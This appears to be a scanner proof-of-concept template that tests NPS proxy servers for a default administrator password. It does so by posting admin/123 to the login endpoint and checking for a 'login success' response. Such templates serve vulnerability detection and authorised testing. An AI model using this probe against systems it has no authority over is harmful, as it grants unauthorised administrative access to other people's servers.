id: poc-yaml-nps-default-password
info:
  name: Nps 默认密码漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Nps
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /login/verify
  headers: {}
  data: username=admin&password=123
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "json") && contains(body, "login success")
  output: []
